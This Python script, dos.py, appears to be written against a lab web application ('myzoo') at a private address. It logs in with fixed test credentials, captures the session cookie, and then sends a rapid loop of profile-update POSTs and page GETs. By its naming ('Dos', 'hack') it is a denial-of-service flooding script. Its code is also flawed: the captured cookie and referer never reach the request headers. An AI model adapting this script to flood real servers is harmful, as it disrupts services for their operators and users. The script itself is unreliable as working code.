#dos.py
import http.client
import urllib.parse
import time

class Dos(object):
    def __init__(self):
        pass

    def login(self,sleepTime,servAddr,url):
        for i in range(1):
            time.sleep(sleepTime)
            try:
                test_data = {'login_username': '1', 'login_password': '1','submit_login':'Log in'}
                test_data_url_encode = urllib.parse.urlencode(test_data)
                conn = http.client.HTTPConnection(servAddr)
                header = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
                conn.request(method="POST", url=url, headers=header, body=test_data_url_encode)
                response = conn.getresponse()
                #print(response.status)
                res_head = response.headers
                set_cookie = res_head.__dict__['_headers'][7]
                cookie = set_cookie[1].split(';')[0]
                #print(cookie)
                res = response.read()
                #print(res)
                #conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                if i % 10 == 0:
                    print("login ok! \ncookie:",cookie)
                return conn,cookie

    def profile(self,conn,sleepTime,your_profile,url,req_head):
        for i in range(1):
            time.sleep(sleepTime)
            try:
                test_data = {'profile_update': your_profile, 'profile_submit': 'Save'}
                test_data_url_encode = urllib.parse.urlencode(test_data)
                header = req_head
                conn.request(method="POST", url=url, headers=header, body=test_data_url_encode)
                response = conn.getresponse()
                res = response.read()
            except IOError as e:
                print("except:",e)
            finally:
                #print('end profile')
                pass

    def query(self,conn,sleepTime,url,req_head):
        for i in range(1):
            time.sleep(sleepTime)
            try:
                header = req_head
                conn.request(method="GET", url=url, headers=header)
                response = conn.getresponse()
                #print(response.status)
                res = response.read()
                #print(res)
                conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                #print('end profile')
                pass



if __name__ == '__main__':
    servAddr = "172.28.13.40"
    url = "/myzoo/"
    url_profile = '/myzoo/index.php'
    url_query = '/myzoo/users.php?user=1'
    cookie = ''
    referer = ''
    req_header = {
    'Accept': 'text / html, application / xhtml + xml, application / xml;q = 0.9, image / webp, image / apng, * / *;q = 0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh - CN, zh;q = 0.9',
    'Connection': 'keep - alive',
    'Cookie': cookie,
    'Host': '172.28.13.40',
    'Referer': referer,
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla / 5.0(WindowsNT6.1;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 67.0.3396.87Safari / 537.36'
    }


    sleepTime = 0.01
    hack = Dos()
    dev,cookie = hack.login(sleepTime, servAddr, url)

    for i in range(100):
        your_profile = str(i)
        referer = 'http://172.28.13.40/myzoo/users.php'
        hack.profile(dev,sleepTime, your_profile, url_profile,req_header)
        referer = 'http://172.28.13.40/myzoo/index.php'
        hack.query(dev,sleepTime,url_query,req_header)